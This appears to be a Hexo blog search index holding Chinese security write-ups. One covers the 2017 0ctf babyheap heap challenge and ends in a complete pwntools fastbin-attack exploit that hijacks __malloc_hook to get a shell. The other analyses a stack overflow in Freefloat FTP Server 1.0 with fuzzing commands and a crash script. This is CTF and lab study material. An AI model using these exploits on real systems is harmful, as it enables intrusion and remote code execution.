<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2021/03/31/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>Fastbin Attack之2017 0ctf babyheap</title>
    <url>/2021/04/03/2017%200ctf%20babyheap%20WriteUp/</url>
    <content><![CDATA[<p>这道题是fastbin_attack经典题，也是我认为有一定难度的题，有两种解法，这里只详细记录了一种，主要知识点有</p>
<ul>
<li>fastbin_attack</li>
<li>libc基地址泄露</li>
<li>__malloc_hook</li>
<li>size错位构造<span id="more"></span></li>
</ul>
<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap">题目链接</a></p>
<h3 id="一、逆向分析"><a href="#一、逆向分析" class="headerlink" title="一、逆向分析"></a>一、逆向分析</h3><p>检查保护措施：64位程序，保护全开</p>
<img src="https://i.loli.net/2021/04/02/EqWyOHQVic1zg5X.png" style="zoom:80%;" />

<h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h4><p>程序通过sub_B70()函数获取一段连续的存储堆分配索引表的空间</p>
<img src="https://i.loli.net/2021/04/02/lmrWsDn3VGzf7pS.png" style="zoom:80%;" />

<h4 id="allocate函数"><a href="#allocate函数" class="headerlink" title="allocate函数"></a>allocate函数</h4><p>根据用户输入分配堆空间，地址存储到索引表中，一块索引的信息是24字节，第一个8字节记录此索引是否被使用，第二个8字节代表分配的大小，第三个8字节是分配的地址，指向chunk</p>
<p>这里分配内存使用calloc，会将内存置0</p>
<img src="https://i.loli.net/2021/04/02/s1w3n9NECGo4SiH.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/04/02/c1bA6NgZzIHBymX.png" style="zoom:80%;" />

<h4 id="Fill函数"><a href="#Fill函数" class="headerlink" title="Fill函数"></a>Fill函数</h4><p>没有对用户输入的size过滤，存在堆溢出漏洞</p>
<img src="https://i.loli.net/2021/04/02/vg4JdRtiCoQ1ruG.png" style="zoom:80%;" />

<h4 id="Free函数和Dump函数"><a href="#Free函数和Dump函数" class="headerlink" title="Free函数和Dump函数"></a>Free函数和Dump函数</h4><p>Free函数释放内存空间，同时将索引表中指针置0，不存在uaf漏洞</p>
<p>dump 就是输出对应索引 chunk 的内容，注意读取内容的大小实在索引表中的记录的大小，也就是一开始分配的大小，不是chunk的size字段大小</p>
<h3 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h3><p>思路：存在任意长度堆溢出，首先泄露libc基地址，通过fastbin_attack篡改一个函数指针，调用这个函数获取shell</p>
<h4 id="泄露libc基地址"><a href="#泄露libc基地址" class="headerlink" title="泄露libc基地址"></a>泄露libc基地址</h4><p>free掉一个chunk到bin中，通过泄露fd和bk指针获取main_arena地址计算出libc_base，fastbin_chunk单向链表只有一个指针fd指向链尾，而main_arena的地址在表头，fastbin的fd指针不会指向main_arena，需有bk指针才能指向表头，所以需要一个双向链表的结构：unsorted_bin</p>
<p>泄露条件：</p>
<ul>
<li><p>使用dump函数读取chunk中的fd和bk指针，读取的chunk必须已经分配</p>
</li>
<li><p>分配内存时使用calloc函数，会将chunk置空，fd和bk也被置空，这与上一条矛盾，因此calloc的chunk不能与free的chunk相同，这就需要使用堆溢出欺骗内存</p>
</li>
</ul>
<p>思路一：使用chunk_extend扩展一个堆，使其与free_chunk重叠，读取扩展的chunk获取free_chunk的fd和bk指针。<del>但是读取的大小的内存在分配的时候已经固定，不能扩大，意味着扩展的内容无法读取此路不通！</del>  这是另一种方法，见文章解法二</p>
<p>思路二：fastbin_attack，欺骗fast_bin的指针指向同一个已经calloc的chunk，再次calloc这个内存，使得一张索引表里有两个指针指向同一个chunk，只需要将一个free掉，令一个dump读取fd和bk指针即可。注意：分配的chunk是fastbin，free的必须为unsorted_bin</p>
<h5 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#indec 2</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#index 3 分配unsorted_bin</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#fastbin_attack</span></span><br><span class="line">extend_0 = flat(cyclic(<span class="number">0x10</span>), <span class="number">0</span>, <span class="number">0x21</span>, <span class="string">b&#x27;\x60&#x27;</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(extend_0), extend_0)</span><br></pre></td></tr></table></figure>

<p>申请3个chunk和1个大小不属于fastbin 的chunk，释放index1和index2</p>
<img src="https://i.loli.net/2021/04/02/bOjfWtH91qnoLzX.png" style="zoom:80%;" />

<p>堆溢出之后，在fastbin中 index1_chunk的fd指针原本指向index2_chunk，改成指向index3_chunk</p>
<img src="https://i.loli.net/2021/04/02/28a7Yyo9SqFPbjh.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/04/02/tzZkic5bHaQDBT9.png" style="zoom:80%;" />

<p>下一步将要分配fastbin中的两个chunk，第二个申请到的就是指向index3_chunk，使得索引表中index2_chunk指向index3_chunk。</p>
<p>fastbin绕过size检查：fastbin表中每一条链中chunk是固定大小，从表中malloc出一个chunk，拆卸前会检查size大小是否属于当前链中，不属于则报错。fastbin_attack时需要在拆卸前将chunk大小改为当前链的大小，绕过size检测</p>
<p>当我需要通过index2_chunk溢出到index3_chunk的size字段时，原本的index2_chunk释放之后没有分配不能写入数据，所以重新构造chunk，在index3_chunk之前多分配一个0x10的chunk，用于溢出，示意图如下</p>
<img src="https://i.loli.net/2021/04/02/OBscS3w59PyAdLT.png" style="zoom: 80%;" />

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 0 to fastbin</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 1 to fastbin</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 2 to fastbin</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 3 to fastbin &lt;-------新增加的chunk</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#index 4 to unsorted_bin</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">extend_0 = flat(cyclic(<span class="number">0x10</span>), <span class="number">0</span>, <span class="number">0x21</span>, <span class="string">b&#x27;\x80&#x27;</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(extend_0), extend_0)</span><br><span class="line"><span class="comment">#修改为fastbins大小，用于分配</span></span><br><span class="line">extend_3 = flat(cyclic(<span class="number">0x10</span>), <span class="number">0</span>, <span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(extend_3), extend_3)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>

<p>新分配之后index2_chunk和index4_chunk指向0x90的chunk</p>
<img src="https://i.loli.net/2021/04/02/YuLx9dwrFTRkyUE.png" style="zoom:80%;" />

<p>索引表已经存在两个指针指向0x90的chunk，那么到了泄露地址最后一步，free掉index4_chunk使其进入unsorted_bin，读取index2获得index4的fd和bk指针，获取main_arena的地址</p>
<p>细节：将index4_chunk大小更改回到0x91，free掉index4之前为了防止其与top_chunk合并，需要新分配一个任意大小的chunk</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改回fastbins大小，用于释放到unsorted_bin</span></span><br><span class="line">extend_3 = flat(cyclic(<span class="number">0x10</span>), <span class="number">0</span>, <span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(extend_3), extend_3)</span><br><span class="line"><span class="comment">#分配一个chunk防止unsorted_chunk与top_chunk合并</span></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">unsorted_main_arena = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(unsorted_main_arena))</span><br></pre></td></tr></table></figure>

<p>在64位系统中unsorted_bin在main_arena+88的位置，32位为main_arena+48</p>
<blockquote>
<p>这个通过free一个0x90大小chunk到unsorted_bin中，查看fd和bk指针可以看到</p>
</blockquote>
<p>main_arena在glibc_2.23的0x3c4b20地址：使用IDA打开glibc_2.23的malloc_trim()函数，main_arena存储在glibc_2.23的.data段</p>
<img src="https://i.loli.net/2021/04/02/lU3TYQRXuEV2oIa.png" style="zoom:80%;" />

<p>对照glibc_2.23源码</p>
<img src="https://i.loli.net/2021/04/02/piN2moHy8xgAOLS.png" style="zoom:80%;" />

<p>libc基地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">main_arena = <span class="number">0x3c4b20</span></span><br><span class="line">libc_base = unsorted_main_arena - (main_arena + <span class="number">88</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc base addr: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/04/02/ZlwpfiGo1WADa7r.png" style="zoom:80%;" />

<h4 id="hook劫持"><a href="#hook劫持" class="headerlink" title="hook劫持"></a>hook劫持</h4><p>往常通过fastbin attack进行got表劫持，这里有两点限制got劫持：</p>
<ul>
<li><p>RELRO全开，将GOT表属性设置为不可写</p>
</li>
<li><p>fastbin如果指向got表，为了通过size校验需要有一个合适的size字段，但是got表中难以找到</p>
</li>
</ul>
<p>这里我们选择hook劫持：</p>
<blockquote>
<p>hook是钩子函数，设计钩子函数的初衷是用于调试，基本格式大体是func_hook(*func,&lt;参数&gt;)，在调用某函数时，如果函数的钩子存在，就会先去执行该函数的钩子函数，通过钩子函数再来回调我们当初要调用的函数，calloc函数与malloc函数的钩子都是malloc_hook</p>
</blockquote>
<p>glibc_2.23中malloc实现</p>
<img src="https://i.loli.net/2021/04/02/qIWQoNVhr1gYtmO.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/04/02/yYqVmX7AB6PvNR1.png" style="zoom:80%;" />

<p>calloc中也都存在malloc_hook函数判断执行，所以调用malloc/calloc函数是都会先判断hook函数是否存在，存在则先调用malloc_hook</p>
<p>为了实现fastbin_attack，是fd指针指向__malloc_hook，需要在附近在其低地址找到合法的size段绕过安全检测，先来查看 _malloc_hook附近的布局</p>
<img src="https://i.loli.net/2021/04/02/hSY1L9AEifvgDkF.png"  />

<img src="https://i.loli.net/2021/04/02/PZe329FhGdEMYoj.png" style="zoom:80%;" />

<img src="https://i.loli.net/2021/04/02/vOUiJ2coFfE3uk8.png" style="zoom:80%;" />

<p>在3C4AF0到3C4B10直接寻找size字段：</p>
<p>因为在64位系统中，地址8字节只使用了低6字节，而且hook函数和_IO_wfile_jumps的偏移地址最高位0x7F，align 20h为0，可以错位构造size：0x3C4AF0为 ? ? ? ? ? 7F 00 00  而 0x3C4AF8 00 00 00 00 00，选择0x3C4AF5~0x3C4AFC：7F 00 00 00 00 00 00 00，对应需要分配的chunk大小位0x60</p>
<img src="https://i.loli.net/2021/04/02/ZmeLt8C79yWsK65.png" style="zoom:80%;" />

<p>之前已经将index4_chunk 释放进unsorted_bin，再次分配0x60可以切割index4_chunk，由0x90成0x60，在free进unsorted_bin，构造0x60的unsorted_bin的链</p>
<p>index2也指向index4_chunk，通过修改index2内容将index4_chunk的 fd 指向__malloc_hook的伪造chunk地址（计算偏移），再次分配两次，一次获得index4_chunk，另一次指向 malloc_hook</p>
<img src="https://i.loli.net/2021/04/02/JM321x6KsGZNSY8.png" style="zoom:80%;" />

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hook_addr = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(hook_addr))</span><br><span class="line"><span class="comment">#构造0x60 unsorted_bin链</span></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造chunk，指向hook</span></span><br><span class="line">fake_chunk = flat(hook_addr - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>, <span class="built_in">len</span>(fake_chunk), fake_chunk)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#获取index6指向hook地址</span></span><br></pre></td></tr></table></figure>

<h4 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One_gadget"></a>One_gadget</h4><p>将malloc_hook篡改为onegadget，之后调用calloc即可</p>
<p>获取onegadget，依次尝试</p>
<img src="https://i.loli.net/2021/04/02/l79YXkywmgFhbIH.png" style="zoom:80%;" />

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadget_addr = libc_base + <span class="number">0x4527a</span></span><br><span class="line"><span class="comment">#篡改__malloc_hook</span></span><br><span class="line">payload = flat(cyclic(<span class="number">0x13</span>), one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"><span class="comment">#触发calloc</span></span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="完整exploit"><a href="#完整exploit" class="headerlink" title="完整exploit"></a>完整exploit</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./babyheap&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./babyheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Command: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 0 to fastbin</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 1 to fastbin</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 2 to fastbin</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index 3 to fastbin &lt;-------新增加的chunk</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#index 4 to unsorted_bin</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">extend_0 = flat(cyclic(<span class="number">0x10</span>), <span class="number">0</span>, <span class="number">0x21</span>, <span class="string">b&#x27;\x80&#x27;</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(extend_0), extend_0)</span><br><span class="line"><span class="comment">#修改为fastbins大小，用于分配</span></span><br><span class="line">extend_3 = flat(cyclic(<span class="number">0x10</span>), <span class="number">0</span>, <span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(extend_3), extend_3)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改回fastbins大小，用于释放到unsorted_bin</span></span><br><span class="line">extend_3 = flat(cyclic(<span class="number">0x10</span>), <span class="number">0</span>, <span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(extend_3), extend_3)</span><br><span class="line"><span class="comment">#分配一个chunk防止unsorted_chunk与top_chunk合并</span></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">unsorted_main_arena = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;unsorted_main_arena_addr: &quot;</span> + <span class="built_in">hex</span>(unsorted_main_arena))</span><br><span class="line"></span><br><span class="line">main_arena = <span class="number">0x3c4b20</span></span><br><span class="line">libc_base = unsorted_main_arena - (main_arena + <span class="number">88</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc base addr: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">hook_addr = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(hook_addr))</span><br><span class="line"><span class="comment">#构造0x60 unsorted_bin链</span></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造chunk，指向hook</span></span><br><span class="line">fake_chunk = flat(hook_addr - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>, <span class="built_in">len</span>(fake_chunk), fake_chunk)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#获取index6指向hook地址</span></span><br><span class="line"></span><br><span class="line">one_gadget_addr = libc_base + <span class="number">0x4527a</span></span><br><span class="line"><span class="comment">#篡改__malloc_hook</span></span><br><span class="line">payload = flat(cyclic(<span class="number">0x13</span>), one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"><span class="comment">#触发calloc</span></span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="三、解法二"><a href="#三、解法二" class="headerlink" title="三、解法二"></a>三、解法二</h3><p>按照本文的思路一：分配两个chunk，index1和index2，扩展index1到index2的fd和bk指针，释放index2，index2的fd和bk指针会指向main_arena，读取index1获取index2的内容</p>
<p>如果直接读取index1，由于读取的index1大小在分配时已经固定在索引表中，与实际的chunk size字段不匹配，需要free掉index1，然后重新分配chunk size大小，可更新索引表中的size，这个时候读取index1内容</p>
<img src="https://i.loli.net/2021/04/02/U8LHXI5bpcwAg3O.png" style="zoom:80%;" />

<h4 id="比较解法一和解法二"><a href="#比较解法一和解法二" class="headerlink" title="比较解法一和解法二"></a>比较解法一和解法二</h4><ul>
<li><p>解法一在释放分配目标unsorted chunk的时候为了绕过fastbin和unsorted_bin需要两次更改size字段以绕过安全检查，可以将大小为fastbin更改为unsorted_bin，应该可以减少安全绕过次数</p>
</li>
<li><p>解法一一直有个问题困扰我，为什么只需要更改最低位一个字节就可以将指针指向目标地址，原来：在libc2.23中，用户分配的第一个堆块就位于堆区起始地址，也就是说用户分配的第一个堆块的地址最低字节一定是00（在目前的libc版本中，堆区的起始地址最低字节都是00），这样可以计算偏移，但在libc2.26的系统中，用户分配的第一个堆块并不位于堆区的起始处！而是从堆区起始地址往后偏移了很大一段距离（可能要根据glibc版本计算偏移） 。解法一容易出现glibc版本不兼容</p>
</li>
</ul>
<p><a href="https://www.anquanke.com/post/id/168009">详细内容</a></p>
<h3 id="四、总结："><a href="#四、总结：" class="headerlink" title="四、总结："></a>四、总结：</h3><p>通过此题get到的新知识</p>
<ul>
<li>fastbin_attack</li>
<li>libc基地址泄露</li>
<li>__malloc_hook</li>
<li>size错位构造</li>
</ul>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul>
<li><a href="https://www.anquanke.com/post/id/168009">https://www.anquanke.com/post/id/168009</a></li>
<li><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack">https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack</a></li>
</ul>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>堆</tag>
        <tag>fastbin_attack</tag>
      </tags>
  </entry>
  <entry>
    <title>Freefloat FTP Server1.0栈溢出漏洞分析</title>
    <url>/2021/03/31/freefloatftpserver1.0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><ul>
<li>漏洞名称：Freefloat FTP server – ‘USER’ Remote Buffer Overflow</li>
<li>漏洞编号：EDB-ID 23243</li>
<li>漏洞类型：栈溢出</li>
<li>漏洞影响：远程代码执行</li>
<li>利用难度：Esay</li>
</ul>
<span id="more"></span>
<h3 id="2-组件概述"><a href="#2-组件概述" class="headerlink" title="2. 组件概述"></a>2. 组件概述</h3><p>freefloatftpserver1.0 用于打开ftp服务，用于上传文件和管理有线及无线设备的软件</p>
<h3 id="3-漏洞影响"><a href="#3-漏洞影响" class="headerlink" title="3. 漏洞影响"></a>3. 漏洞影响</h3><p>freefloatftpserver1.0</p>
<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><ul>
<li>靶机环境：Windows xp sp3</li>
<li>靶机配置：<ul>
<li> freefloatftpserver1.0</li>
<li> Immunity Debugger</li>
<li> Mona</li>
</ul>
</li>
<li>攻击机：kali 2.0</li>
<li>攻击机配置<ul>
<li>­    Pwntools</li>
<li>­    Metasploit</li>
</ul>
</li>
</ul>
<h3 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2. 复现过程"></a>2. 复现过程</h3><p>使用两种工具Infigo FTPStress Fuzzer和Metasploit都能测试出溢出漏洞存在</p>
<h4 id="2-1-使用Infigo-FTPStress-Fuzzer触发漏洞"><a href="#2-1-使用Infigo-FTPStress-Fuzzer触发漏洞" class="headerlink" title="2.1 使用Infigo FTPStress Fuzzer触发漏洞"></a>2.1 使用Infigo FTPStress Fuzzer触发漏洞</h4><h5 id="2-1-1-在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口"><a href="#2-1-1-在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口" class="headerlink" title="2.1.1 在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口"></a>2.1.1 在windowsXP运行漏洞程序，程序打开ftp服务，并监听21号端口</h5><img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/1.png?raw=true" style="zoom:80%">

<h5 id="2-1-2-ftpfuzz触发漏洞"><a href="#2-1-2-ftpfuzz触发漏洞" class="headerlink" title="2.1.2 ftpfuzz触发漏洞"></a>2.1.2 ftpfuzz触发漏洞</h5><img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/2.png?raw=true" style="zoom:80%">

<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/3.png?raw=true" style="zoom:60%">

<p>eip指向fuzz发送的测试数组‘AAAA‘，程序执行流已被更改，存在溢出漏洞</p>
<h4 id="2-2-使用metasploit的ftp-fuzz进行测试"><a href="#2-2-使用metasploit的ftp-fuzz进行测试" class="headerlink" title="2.2 使用metasploit的ftp fuzz进行测试"></a>2.2 使用metasploit的ftp fuzz进行测试</h4><p>攻击机kali运行metasploit，运行如下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">打开metasploit</span></span><br><span class="line">msfconsole</span><br><span class="line"><span class="meta">#</span><span class="bash">查询可用的fuzz</span></span><br><span class="line">search fuzzing</span><br><span class="line"><span class="meta">#</span><span class="bash">使用ftp fuzz模块</span></span><br><span class="line">use auxiliary/fuzzers/ftp/ftp_pre_post</span><br><span class="line"><span class="meta">#</span><span class="bash">设置靶机</span></span><br><span class="line">set RHOST 192.168.112.146</span><br><span class="line"><span class="meta">#</span><span class="bash">漏洞利用</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/4.png?raw=true" style="zoom:70%">
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/5.png?raw=true" style="zoom:60%">

<p>靶机崩溃，eip指向未知内存地址，可以溢出</p>
<h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1-背景知识"><a href="#1-背景知识" class="headerlink" title="1. 背景知识"></a>1. 背景知识</h3><p>最简单的栈溢出，jmp esp作为跳板跳转到栈中执行</p>
<h3 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2. 详细分析"></a>2. 详细分析</h3><h4 id="2-1-Immunity-Debugger调试"><a href="#2-1-Immunity-Debugger调试" class="headerlink" title="2.1 Immunity Debugger调试"></a>2.1 Immunity Debugger调试</h4><p>在靶机用Immunity Debugger打开freefloatftpserver1.0运行调试</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/6.png?raw=true" style="zoom:80%">

<h4 id="2-2-python发包测试"><a href="#2-2-python发包测试" class="headerlink" title="2.2 python发包测试"></a>2.2 python发包测试</h4><p>在kali攻击机用pwntools编写脚本，向ftp服务器的USER输入点发送数据包测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;192.168.112.146&quot;</span>, <span class="number">21</span>)</span><br><span class="line">paylad = <span class="string">&#x27;A&#x27;</span>*<span class="number">500</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>程序崩溃，eip指向0x41414141，由发送的数据A的ascii码为0x41可知，USER输入点存在溢出漏洞</p>
<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/7.png?raw=true" style="zoom:80%">

